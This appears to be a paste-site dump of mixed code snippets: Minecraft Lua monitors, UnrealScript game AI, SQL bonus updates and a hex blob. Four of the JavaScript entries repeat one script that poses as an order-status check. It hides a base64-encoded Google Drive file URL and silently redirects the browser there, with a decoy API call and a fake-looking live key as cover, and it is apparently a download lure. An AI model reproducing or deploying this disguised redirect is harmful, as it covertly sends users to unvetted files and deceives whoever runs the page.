id,title,username,language,date,content
kNPbP71C,Untitled,x2LeaF,JavaScript,Tuesday 25th of March 2025 07:01:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/375/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JNtv5KTZ,dataNone,TestGuy1,JSON,Tuesday 25th of March 2025 07:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'a41ac81358fa2cf57bd6c59e979a820a5ea7bac503055560f2f5b254d8357dfb8a1a622563c878c4646f8ce52bd99c442c75e6866d7deb731b79eaaba0f22e8d4b9ff56f5146de71ba57026b6dee1599526d8435cd444ec91b2647fdeb9a8ee7311024fe8560b7195eb5adb9abafcc87a0b02c79ee934c0fc3f0bb34c183a2fa',
  otherdata: [
    '7a2c1b097678747a70cc722d213ae026',
    '999c791a384ff3299838c68978fa039d',
    '80a1053005849c7c2f62326849ef8e9c',
    '64c1c9e20990b22b3ab1b2dae42b17fe',
    'd679ccccad7cc87701536ef17f7f4302',
    '7d4a8435b1b18f8489065aa26c42d863',
    '50486717056aaec1dfa7a720e1bb10b3',
    'f769e10c035e0f9d69321f07a2517879'
  ]
}"
cEKmkjEz,Untitled,x2LeaF,JavaScript,Tuesday 25th of March 2025 06:49:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/715/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9ss3yHkh,Untitled,x2LeaF,JavaScript,Tuesday 25th of March 2025 06:37:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/722/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Be7c88b0,Untitled,x2LeaF,JavaScript,Tuesday 25th of March 2025 06:25:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/262/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ve0gfzMV,Заявки от ГМОв BFa за 2ю половину марта 2025,Sansuall,MySQL,Tuesday 25th of March 2025 05:34:44 AM CDT,"-- Вечность
update TBonuses set fcount = fcount + 1700 where f_account in (4208, 169012, 190164, 123706); 

-- EvTech
update TBonuses set fcount = fcount + 426 where f_account in (77168); 

-- Vusale(за 1ю и 2ю половину марта)
update TBonuses set fcount = fcount + 600 where f_account in (204887);
update TBonuses set fcount = fcount + 1080 where f_account in (211177);
update TBonuses set fcount = fcount + 1799 where f_account in (192600);
update TBonuses set fcount = fcount + 749 where f_account in (207153);
update TBonuses set fcount = fcount + 749 where f_account in (190254);
update TBonuses set fcount = fcount + 749 where f_account in (8801);
update TBonuses set fcount = fcount + 320 where f_account in (81150);"
gyGkakB9,Untitled,Koridev,Lua,Tuesday 25th of March 2025 05:18:43 AM CDT,"--[[
   Dynamisches AE2-Monitor-Skript mit Advanced Peripherals (meBridge).
   Summiert usedBytes/totalBytes aus listCells(), um ""Speicher Frei %"" zu ermitteln.
   Zeigt pro Seite mehrere Cells als Kästchen mit % Auslastung.
   Klick auf Cell => Zeigt Top-Items im gesamten ME-Netzwerk.
   Unten: Infozeile mit ""Cells"", ""Items"" und ""Frei"".
]]

-------------------------
-- 1) Konfiguration
-------------------------
local monSide = ""right""      -- Monitor-Seite (z.B. ""left"")
local meSide  = ""left""       -- meBridge-Seite (z.B. ""right"")
local BOX_W   = 14           -- Breite der ""Kästchen"" (Zeichen)
local BOX_H   = 4            -- Höhe der ""Kästchen"" (Zeichen)
local ITEMS_PER_PAGE = 10    -- Anzahl Items in der Detailansicht
local REFRESH_INTERVAL = 10  -- Auto-Refresh in Sekunden (nur Hauptmenü)

-------------------------
-- 2) Peripherie-Abfrage
-------------------------
local mon = peripheral.wrap(monSide)
local me  = peripheral.wrap(meSide)

if not mon then
  error(""Monitor an Seite '""..monSide..""' nicht gefunden!"")
end
if not me then
  error(""meBridge an Seite '""..meSide..""' nicht gefunden!"")
end

-- Prüfe, ob listCells() existiert
if not me.listCells then
  error(""meBridge hat keine Funktion 'listCells'! Version zu alt?"")
end

mon.setTextScale(0.5)

-------------------------
-- 3) Variablen
-------------------------
local width, height = mon.getSize()
local currentScreen = ""main""
local currentPage   = 1
local cells         = {}
local totalPages    = 1

-------------------------
-- 4) Hilfsfunktionen
-------------------------
local function clear()
  mon.setBackgroundColor(colors.black)
  mon.clear()
  mon.setCursorPos(1, 1)
end

local function centerText(y, text, color)
  color = color or colors.white
  mon.setTextColor(color)
  local x = math.floor((width - #text) / 2)
  mon.setCursorPos(x + 1, y)
  mon.write(text)
end

-- Dynamische Farbwahl basierend auf Auslastung:
local function getColorForUsage(used, total)
  if total == 0 then
    -- Keine Kapazität -> wir tun so, als sei es ""leer""
    return colors.lime
  end
  local percent = used / total
  if percent >= 0.9 then
    return colors.red
  elseif percent >= 0.5 then
    return colors.yellow
  else
    return colors.lime
  end
end

-- Summiert usedBytes + totalBytes aller Cells, um die Gesamt-Auslastung zu berechnen
local function getTotalUsedAndTotal()
  local c = me.listCells() or {}
  local sumUsed  = 0
  local sumTotal = 0
  for _, cell in ipairs(c) do
    sumUsed  = sumUsed  + (cell.usedBytes  or 0)
    sumTotal = sumTotal + (cell.totalBytes or 0)
  end
  return sumUsed, sumTotal
end

-------------------------
-- 4.1) Box-Zeichnung
-------------------------
local function drawCellBox(x, y, w, h, cellIndex, usedB, totalB)
  -- ASCII-Rahmen oben
  mon.setCursorPos(x, y)
  mon.setTextColor(colors.white)
  mon.write(""+"")
  for i = 1, w - 2 do
    mon.write(""-"")
  end
  mon.write(""+"")

  -- Seiten
  for row = 1, h - 2 do
    mon.setCursorPos(x, y + row)
    mon.write(""|"")
    mon.setCursorPos(x + w - 1, y + row)
    mon.write(""|"")
  end

  -- ASCII-Rahmen unten
  mon.setCursorPos(x, y + h - 1)
  mon.write(""+"")
  for i = 1, w - 2 do
    mon.write(""-"")
  end
  mon.write(""+"")

  -- Cell-Überschrift
  mon.setCursorPos(x + 1, y + 1)
  mon.setTextColor(colors.white)
  mon.write(""Cell ""..cellIndex)

  -- Prozent berechnen
  local percent = 0
  if totalB > 0 then
    percent = math.floor((usedB / totalB) * 100)
  end

  -- Farbe nach Auslastung
  local usageColor = getColorForUsage(usedB, totalB)
  mon.setTextColor(usageColor)

  mon.setCursorPos(x + 1, y + 2)
  mon.write(usedB .. ""/"" .. totalB .. "" ("" .. percent .. ""%)"")
end

-------------------------
-- 5) Hauptmenü zeichnen
-------------------------
local function drawMainScreen()
  clear()
  centerText(1, ""AE2 Cells Overview (Page ""..currentPage.."")"", colors.cyan)

  -- Wie viele Boxen passen in die Monitor-Breite/Höhe?
  -- (Wir reservieren unten 2 Zeilen: eine für Infozeile, eine für Buttons.)
  local columns = math.floor(width / BOX_W)
  local rows    = math.floor((height - 3) / BOX_H)

  if columns < 1 or rows < 1 then
    centerText(math.floor(height/2), ""Monitor zu klein!"", colors.red)
    return
  end

  local boxesPerPage = columns * rows
  totalPages = math.ceil(#cells / boxesPerPage)

  local startCell = (currentPage - 1) * boxesPerPage + 1
  local endCell   = math.min(startCell + boxesPerPage - 1, #cells)

  local idx = startCell
  for row = 0, rows - 1 do
    for col = 0, columns - 1 do
      if idx > endCell then break end
      local cell = cells[idx]
      -- Falls leer, setze 0
      local usedB  = cell.usedBytes  or 0
      local totalB = cell.totalBytes or 0

      local x = col * BOX_W + 1
      local y = row * BOX_H + 2
      drawCellBox(x, y, BOX_W, BOX_H, idx, usedB, totalB)

      idx = idx + 1
    end
    if idx > endCell then break end
  end

  ----------------------
  -- Infozeile unten
  ----------------------
  -- 1) Alle Cells
  local cellCount = #cells

  -- 2) Alle Items
  local itemList  = me.listItems() or {}
  local itemCount = #itemList

  -- 3) Speicher frei (selbst berechnet)
  local sumUsed, sumTotal = getTotalUsedAndTotal()
  local freePercent = 0
  if sumTotal > 0 then
    freePercent = math.floor((sumTotal - sumUsed) / sumTotal * 100)
  end

  mon.setCursorPos(2, height - 1)
  mon.setTextColor(colors.white)
  mon.write(string.format(""Cells: %d  Items: %d  Frei: %d%%"", cellCount, itemCount, freePercent))

  -- Seitenbuttons (ganz unten)
  mon.setCursorPos(2, height)
  if currentPage > 1 then
    mon.write(""[ < ]"")
  end

  mon.setCursorPos(width - 5, height)
  if currentPage < totalPages then
    mon.write(""[ > ]"")
  end
end

-------------------------
-- 5.1) Detail-Items
-------------------------
local function getItemsSortedByAmount()
  -- Listet ALLE Items im Netzwerk => nicht cell-spezifisch
  local items = me.listItems()
  if not items then return {} end

  -- Sortieren nach amount DESC
  table.sort(items, function(a, b)
    return (a.amount or 0) > (b.amount or 0)
  end)
  return items
end

local function drawCellDetails(cellIndex)
  clear()
  centerText(1, ""Cell ""..cellIndex.."" - Top Items"", colors.cyan)

  local items = getItemsSortedByAmount()
  local y     = 3
  local shown = 0

  for _, item in ipairs(items) do
    if y >= height then break end
    mon.setCursorPos(2, y)
    mon.setTextColor(colors.white)
    mon.write((item.displayName or ""?"").."": ""..(item.amount or 0))
    y     = y + 1
    shown = shown + 1
    if shown >= ITEMS_PER_PAGE then
      break
    end
  end

  mon.setCursorPos(2, height)
  mon.setTextColor(colors.gray)
  mon.write(""[ Zurueck ]"")
end

-------------------------
-- 6) Klick -> Welche Cell?
-------------------------
local function getCellIndexFromClick(x, y)
  local columns = math.floor(width / BOX_W)
  local rows    = math.floor((height - 3) / BOX_H)
  local boxesPerPage = columns * rows
  local startCell    = (currentPage - 1) * boxesPerPage + 1
  local endCell      = math.min(startCell + boxesPerPage - 1, #cells)

  local col = math.floor((x - 1) / BOX_W)
  local row = math.floor((y - 2) / BOX_H)
  if col < 0 or col >= columns or row < 0 or row >= rows then
    return nil
  end

  local cellOffset  = row * columns + col
  local actualIndex = startCell + cellOffset
  if actualIndex <= endCell then
    return actualIndex
  end
  return nil
end

-------------------------
-- 7) Event-Loop
-------------------------
local function main()
  cells = me.listCells() or {}
  drawMainScreen()

  local refreshTimer = os.startTimer(REFRESH_INTERVAL)

  while true do
    local event, p1, p2, p3 = os.pullEvent()

    if event == ""monitor_touch"" then
      local x, y = p2, p3

      if currentScreen == ""main"" then
        -- Blättern?
        if y == height then
          -- [ < ]
          if x >= 2 and x <= 5 and currentPage > 1 then
            currentPage = currentPage - 1
            drawMainScreen()
            goto continue
          end
          -- [ > ]
          if x >= width - 4 and x <= width and currentPage < totalPages then
            currentPage = currentPage + 1
            drawMainScreen()
            goto continue
          end
        end

        -- Klick auf Cell?
        local cellIndex = getCellIndexFromClick(x, y)
        if cellIndex then
          currentScreen = ""cell""
          drawCellDetails(cellIndex)
        end

      elseif currentScreen == ""cell"" then
        -- Zurueck-Button
        if y == height then
          currentScreen = ""main""
          drawMainScreen()
        end
      end

      ::continue::

    elseif event == ""timer"" then
      if p1 == refreshTimer then
        if currentScreen == ""main"" then
          cells = me.listCells() or {}
          drawMainScreen()
        end
        refreshTimer = os.startTimer(REFRESH_INTERVAL)
      end
    end
  end
end

main()
"
XGUBsgUK,StinkyController - AmmoPPPM,poosh,UnrealScript,Tuesday 25th of March 2025 04:16:21 AM CDT,"class StinkyController extends ScriptedController;

var FtgGame FtgGame;
var byte TeamIndex; // is set by FtgGame
var StinkyClot StinkyClot;

var array<Actor> MoveTargets;

var array<KFAmmoPickup> AmmoCandidates;
var transient KFAmmoPickup CurrentAmmoCandidate;
var int AmmoSpawnCount, MaxAmmoSpawnCount;
var transient int AmmoSpawned;
var float AmmoPPPM; // Ammo spawned Per Player Per Minute
var transient float LastAmmoSpawnTime; 

var transient Actor LastAlternatePathTarget;
var transient NavigationPoint LastAlternatePathPoint;
var transient Actor OldMoveTarget;
var transient Actor TeleportTarget;
var transient int TeleportAttempts;
var transient int ActionMoves;
var int MoveAttempts;
var float GuardianReachTime; // max time to reach the guardian. Gets extended if Stinky cannot see the guardian;
var transient float GuardianReachDeadline;
var int GuardianVisibilityChecks;

var localized string BlameStr;

function PostBeginPlay()
{
    FtgGame = FtgGame(Level.Game);
    AmmoCandidates = FtgGame.StinkyAmmoPickups;
    LastAmmoSpawnTime = Level.TimeSeconds;
    super.PostBeginPlay();
}

function Possess(Pawn aPawn)
{
    super.Possess(aPawn);
    StinkyClot = StinkyClot(Pawn);
    if ( StinkyClot != none && FtgGame != none) {
        FtgGame.StinkyControllerReady(self);
    }
}

function TakeControlOf(Pawn aPawn) {}

function int GetActionCount()
{
    return MoveTargets.length;
}

function Actor GetActionStart()
{
    if ( ActionNum > 0 && ActionNum - 1 < MoveTargets.length )
        return MoveTargets[ActionNum - 1];
    return none;
}

function Actor GetActionTarget()
{
    if ( ActionNum < MoveTargets.length )
        return MoveTargets[ActionNum];
    return none;
}

function Actor GetMoveTarget()
{
    local Actor result;

    result = GetActionTarget();
    if ( result != none && result == LastAlternatePathTarget && LastAlternatePathPoint != none )
        result = LastAlternatePathPoint; // target unreachable -> reroute to closest nav. point
    return result;
}

function Stuck()
{
    local NavigationPoint N;
    local string s;

    if ( Target == none ) {
        warn(""No Target"");
        return;
    }

    if ( LastAlternatePathTarget == Target && LastAlternatePathPoint != none ) {
        // make sure we don't use this navigation point anymore
        FtgGame.InvalidatePathTarget(LastAlternatePathPoint);
    }

    s = ""Unreachable actor "" $ GetItemName(string(Target)) $ "" @ ("" $ Target.Location $ "")"";
    N = FtgGame.FindClosestPathNode(Target);

    if ( N == none ) {
        log(s $ "" => abort"", class.name);
    }
    else {
        log(s $ "" => rerouting to "" $ N, class.name);
        MoveTarget = FindPathToward(N, false);
    }
    LastAlternatePathTarget = Target;
    LastAlternatePathPoint = N;
}

function CompleteAction()
{
    FtgGame.StinkyControllerCompeledAction(self, ActionNum++);
}

function TakeActor(Actor A)
{
    A.SetBase(Pawn);
    Pawn.AttachToBone(A, StinkyClot.GrabBone);
}

function int CalcSpeed()
{
    return StinkyClot.OriginalGroundSpeed;
}

function AdjustSpeed()
{
    local int spd;

    if (StinkyClot == none || StinkyClot.Health <= 0)
        return;

    spd = CalcSpeed();
    // if (spd != int(StinkyClot.GroundSpeed)) {
    //     log(""Stinky Speed "" $ int(StinkyClot.GroundSpeed) $ "" => "" $ spd, class.name);
    // }
    StinkyClot.GroundSpeed = spd;
    StinkyClot.WaterSpeed = spd;
    StinkyClot.AirSpeed = spd;
    StinkyClot.HiddenGroundSpeed = spd;
}

function bool CanSpeedAdjust()
{
    return false;
}

function float PlayCompleteAnimation()
{
    if( Pawn.Physics==PHYS_Falling )
    {
        Pawn.SetPhysics(PHYS_Walking);
    }

    Pawn.SetAnimAction('KnockDown'); // dunno why but the next anim doesn't work without this
    Pawn.SetAnimAction(StinkyClot.CompleteAnim);
    Pawn.Acceleration = vect(0, 0, 0);
    Pawn.Velocity.X = 0;
    Pawn.Velocity.Y = 0;
    Return 0.8;
}

function float AfterCompleteCooldown()
{
    return 2.0;
}

function WhatToDoNext()
{
    log(""Stuck at state "" $ GetStateName(), class.name);
}

function DoAdditionalActions()
{
}

state LatentDeath
{
Begin:
    sleep(2.0);
    if ( Pawn != none ) {
        Pawn.Suicide();
    }
}

state Moving extends Scripting
{
    ignores Timer;

    function AbortScript()
    {
        if ( StinkyClot != none ) {
            StinkyClot.Suicide();
        }
        LeaveScripting();
    }

    function SetMoveTarget()
    {
        Focus = ScriptedFocus;
        Target = GetMoveTarget();
        if ( Target == None ) {
            Pawn.Suicide();
            //GotoState('Broken');
            return;
        }
        if ( Focus == None )
            Focus = Target;
        MoveTarget = Target;
        TeleportTarget = none;

        if ( MoveTarget != none && !ActorReachable(MoveTarget) ) {
            MoveTarget = FindPathToward(MoveTarget, false);
            if ( MoveTarget == none && ActionMoves == 0 ) {
                // this could be a dead end, like badly placed ammo box or base guardian
                // teleport one step back and try again
                log(""No path to "" $ GetItemName(string(Target)), class.name);
                TeleportTarget = StinkyClot.MoveHistory[1];
                ActionMoves++;
                if ( TeleportTarget != none )
                    return;
            }

            if ( MoveTarget == none || (MoveTarget == OldMoveTarget && --MoveAttempts <= 0) ) {
                log(""Stuck @ ("" $ Pawn.Location $ "") while navigating to "" $ GetItemName(string(MoveTarget))
                        $ "" / "" $ GetItemName(string(Target)), class.name);
                StinkyClot.LogPath();

                switch (TeleportAttempts) {
                    case 0:
                        if ( CurrentPath != none && CurrentPath.End != none ) {
                            TeleportTarget = CurrentPath.End;
                            break;
                        }
                        // else fallthrough
                    case 1:
                        if ( NextRoutePath != none && NextRoutePath.End != none ) {
                            TeleportTarget = NextRoutePath.End;
                            break;
                        }
                        // else fallthrough
                    default:
                        Stuck();
                }
                if ( TeleportTarget != none )
                    return;
            }
        }

        if ( MoveTarget == None ) {
            AbortScript();
            return;
        }

        if ( Focus == Target )
            Focus = MoveTarget;
        if ( OldMoveTarget != MoveTarget ) {
            ActionMoves++;
            StinkyClot.OnMoveTarget(MoveTarget);
            OldMoveTarget = MoveTarget;
            MoveAttempts = default.MoveAttempts;
        }
        // Level.GetLocalPlayerController().ClientMessage(""Moving to "" $ GetItemName(string(MoveTarget)) $ "" / "" $ GetItemName(string(Target)), 'log');
    }

    function CompleteAction()
    {
        global.CompleteAction();
    }

Begin:
    Pawn.SetMovementPhysics();
    WaitForLanding();
KeepMoving:
    if ( StinkyClot.TeleportPhase != StinkyClot.TELEPORT_NONE ) {
        // wait for teleportation to finish
        sleep(1.0);
        Goto('Begin');
    }
    DoAdditionalActions();
    SetMoveTarget();
Teleporting:
    if ( TeleportTarget != none ) {
        StinkyClot.TeleportToActor(TeleportTarget);
        TeleportTarget = none;
        TeleportAttempts++;
        Goto('KeepMoving');
    }
    TeleportAttempts = 0;
    AdjustSpeed();
    // MayShootTarget();
    if ( MoveTarget != None && MoveTarget != Pawn ) {
        MoveToward(MoveTarget, Focus,,,Pawn.bIsWalking);

        if ( !Pawn.ReachedDestination(GetMoveTarget()) ) {
            Goto('KeepMoving');
        }

        ActionMoves = 0;
        MoveTarget = none;
        // make sure the Stinky Clot won't teleport at this phase
        StinkyClot.StuckCounter = 0;
        StinkyClot.NextStuckTestTime = Level.TimeSeconds + 5;
    }
Completing:
    sleep(PlayCompleteAnimation());
    CompleteAction();
    sleep(AfterCompleteCooldown());
    WhatToDoNext();
}

state MoveToGuardian extends Moving
{
    function BeginState()
    {
        super.BeginState();
        SetTimer(60, false);
        GuardianReachDeadline = 0;
        GuardianVisibilityChecks = GuardianReachTime;
    }

    function EndState()
    {
        super.EndState();
        SetTimer(GuardianReachTime, false);
    }

    function Timer()
    {
        if (GuardianReachDeadline == 0) {
            if (GuardianVisibilityChecks <= 0 || LineOfSightTo(Target)) {
                GuardianReachDeadline = Level.TimeSeconds + GuardianReachTime;
                SetTimer(GuardianReachTime + 0.1, false);
                log(FtgGame.ScrnBalanceMut.GameTimeStr() $ "" Base Deadline in "" $ GuardianReachTime, class.name);
            }
            else {
                // wait for the line of sight
                SetTimer(1, false);
                --GuardianVisibilityChecks;
            }
        }
        else if (Level.TimeSeconds < GuardianReachDeadline) {
            SetTimer(GuardianReachDeadline - Level.TimeSeconds + 0.1, false);
        }
        else {
            log(FtgGame.ScrnBalanceMut.GameTimeStr() $ "" Base Deadline reached"", class.name);
            SetTimer(GuardianReachTime, false); // shouldn't trigger
            // FtgBaseGuardian(Target).BlameBaseSetter(BlameStr);
            TeleportTarget = GetMoveTarget();
            GotoState(, 'Teleporting');
        }
    }

    function Stuck()
    {
        global.Stuck();

        if ( MoveTarget == none && LastAlternatePathPoint != none && TeleportAttempts < 3 ) {
            // Most-likely spawned in glitch spot due to map level design
            // teleport next to guardian
            TeleportTarget = LastAlternatePathPoint;
        }
        // else if ( FtgBaseGuardian(Target) != none ) {
        //     FtgBaseGuardian(Target).BlameBaseSetter(BlameStr);
        // }
    }

    function int CalcSpeed()
    {
        if ( FtgGame.bWaveBossInProgress )
            return StinkyClot.MaxBoostSpeed;

        return min( Pawn.GroundSpeed + 2, StinkyClot.MaxBoostSpeed ) ; // each call move faster and faster
    }
}

state MoveToShop extends Moving
{
    function AbortScript()
    {
        if ( ActionNum < MoveTargets.length-1 )
            CompleteAction();
        else
            super.AbortScript();
    }

    function Actor GetMoveTarget()
    {
        if ( ActionNum < MoveTargets.length-1 && FtgGame.TotalMaxMonsters <= 0
                && FtgGame.NumMonsters <= 16 + rand(16) )
        {
            ActionNum = MoveTargets.length-1; // end of the wave -> move directly to the last target
        }
        return global.GetMoveTarget();
    }

    function Stuck()
    {
        if ( KFAmmoPickup(Target) != none ) {
            AbortScript();
        }
        else {
            global.Stuck();
        }
    }

    function DoAdditionalActions()
    {
        local KFAmmoPickup ammo;
        local int i;

        if ( FtgGame.TSCGRI.MaxMonsters < 16 )
            return; // no ammo spawning during end of the game

        for ( i = AmmoCandidates.length - 1; i >= 0; --i ) {
            ammo = AmmoCandidates[i];
            if ( abs(Pawn.Location.Z - ammo.Location.Z) < 100
                    && VSizeSquared(Pawn.Location - ammo.Location) < 1000000 // 20m
                    && Pawn.FastTrace(Pawn.Location, ammo.Location) )
            {
                AmmoCandidates.remove(i, 1);
                if ( ammo.bSleeping ) {
                    CurrentAmmoCandidate = ammo;
                    GotoState( 'MoveToAmmo', 'Begin' ); // go for ammo
                } // else ammo is already spawned
                return;
            }
        }
    }

    function int CalcSpeed()
    {
        local TSCBaseGuardian gnome;

        gnome = FtgGame.TeamBases[TeamIndex];
        if (FtgGame.TotalMaxMonsters <= 0 && !FtgGame.bWaveBossInProgress) {
            if ( FtgGame.NumMonsters < 10 )
                return StinkyClot.MaxBoostSpeed;
            else if (gnome.SameTeamCounter < gnome.default.SameTeamCounter)
                return StinkyClot.OutOfBaseSpeed; // slowdown when nobody at the base to give team a chance to reach the base
            else
                return 2.0 * StinkyClot.OriginalGroundSpeed;
        }
        else if (gnome.SameTeamCounter < gnome.default.SameTeamCounter)
            return StinkyClot.OutOfBaseSpeed; // slowdown when nobody at the base to give team a chance to reach the base
        else if (FtgGame.TotalMaxMonsters < 50  && !FtgGame.bWaveBossInProgress)
            return StinkyClot.OriginalGroundSpeed * (2.0 - FtgGame.TotalMaxMonsters/50.0);
        else
            return StinkyClot.OriginalGroundSpeed;
    }

    function CompleteAction()
    {
        AmmoCandidates = FtgGame.StinkyAmmoPickups; // allow respawing ammo boxes
        global.CompleteAction();
    }
}

state MoveToAmmo extends Moving
{
    function BeginState()
    {
        super.BeginState();
        SetTimer(30, false);

        AmmoSpawned = 0;
        AmmoSpawnCount = default.AmmoSpawnCount;
        if (AmmoPPPM < 1.1 * default.AmmoPPPM) {
            // extra ammo box per 3 players
            AmmoSpawnCount += FtgGame.AliveTeamPlayerCount[TeamIndex] / 3;
            // If AmmoPPPM drastically drops, spawn more ammo even in 1-2 player games
            AmmoSpawnCount = max(AmmoSpawnCount, 1.5 * default.AmmoPPPM / AmmoPPPM);
            AmmoSpawnCount = min(AmmoSpawnCount, MaxAmmoSpawnCount);
        }
    }

    function EndState()
    {
        super.EndState();
        SetTimer(0, false);
    }

    function Timer()
    {
        AbortScript();
    }

    function Actor GetMoveTarget()
    {
        return CurrentAmmoCandidate;
    }

    function AbortScript()
    {
        // if can't reach ammo box, then just exit the state intead of aborting the entire script
        CurrentAmmoCandidate = none;
        WhatToDoNext();
    }

    function Stuck()
    {
        AbortScript();
    }

    function CompleteAction()
    {
        local float dt;

        CurrentAmmoCandidate.GotoState('Pickup');

        if (++AmmoSpawned >= AmmoSpawnCount) {
            dt = Level.TimeSeconds - LastAmmoSpawnTime;
            class'ScrnFunctions'.static.lpf(AmmoPPPM, 
                    AmmoSpawned * 60.0 / dt / fmax(1.0, FtgGame.AliveTeamPlayerCount[TeamIndex]),
                    dt, 60.0);
            class'ScrnFunctions'.static.dbg(self, ""Sinky Spawned "" $ AmmoSpawned "" ammo in "" $ dt 
                    $ ""s. AmmoPPPM=""$AmmoPPPM);
            LastAmmoSpawnTime = Level.TimeSeconds;
            WhatToDoNext();
        }
    }

    function WhatToDoNext()
    {
        if (AmmoSpawnCount <= 0 || CurrentAmmoCandidate == none || CurrentAmmoCandidate.IsInState('Pickup')) {
            // get back to the mision
            CurrentAmmoCandidate = none;
            GotoState('MoveToShop', 'Begin');
        }
        else {
            // spawn ammo once again
            GotoState(, 'Completing');
        }
    }
}

defaultproperties
{
    GuardianReachTime=45
    MoveAttempts=5
    TeamIndex=1
    BlameStr=""%p blamed for setting the base in a glitch spot!""
    AmmoSpawnCount=1
    MaxAmmoSpawnCount=5
    AmmoPPPM=1.0
}"
mN3zgYPm,allthemodium scanner,Rukus308,Lua,Tuesday 25th of March 2025 04:06:01 AM CDT,"local scanner = peripheral.find(""geoScanner"")
if not scanner then
    print(""No GeoScanner found! Attach a GeoScanner and try again."")
    return
end

print(""Enter scan radius (max 8 recommended):"")
local radius = tonumber(read())
if not radius or radius < 1 or radius > 16 then
    print(""Invalid radius. Using default of 16."")
    radius = 16
end

-- Ore color mappings
local oreColors = {
    [""allthemodium:allthemodium_ore""] = colors.orange,
    [""allthemodium:allthemodium_slate_ore""] = colors.orange,
}

print(""Scanning continuously... Press Ctrl + T to stop."")
while true do
    local blocks = scanner.scan(radius)
    if not blocks then
        print(""Scan failed. Retrying..."")
        sleep(5)
        goto continue
    end

    -- Clear the screen
    term.setTextColor(colors.white)
    term.setBackgroundColor(colors.black)
    term.clear()

    -- Get screen size
    local width, height = term.getSize()
    local centerX, centerY = math.floor(width / 2), math.floor(height / 2)

    -- Draw detected ores with correct X/Z mapping
    for _, block in ipairs(blocks) do
        if oreColors[block.name] then
            local x = centerX + block.x + 1 -- Left/Right
            local y = centerY + block.z     -- Forward/Backward (mapped to screen Y)
            local color = oreColors[block.name]
            local char = """"
            
            -- Ensure coordinates stay within screen bounds
            if x < 1 then 
                x = 1
                char = ""\27""
            end
            if x > width then 
                x = width
                char = ""\26""
            end
            if y < 1 then 
                y = 1
                char = ""\24""
            end
            if y > height then 
                y = height
                char = ""\25""
            end
            
            -- Only draw pixel and marker within bounds
